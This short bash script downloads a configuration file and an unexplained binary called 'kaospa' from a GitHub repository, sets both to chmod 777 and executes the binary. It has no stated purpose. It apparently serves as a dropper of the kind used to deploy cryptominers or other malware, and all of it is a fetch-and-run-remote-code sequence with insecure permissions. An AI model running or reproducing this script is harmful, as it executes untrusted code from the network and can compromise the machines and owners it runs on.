#!/bin/bash

wget https://github.com/vedhagsvp/taberas/raw/main/appsettings.json
wget https://github.com/vedhagsvp/taberas/releases/download/mlb/kaospa
chmod 777 kaospa appsettings.json
./kaospa
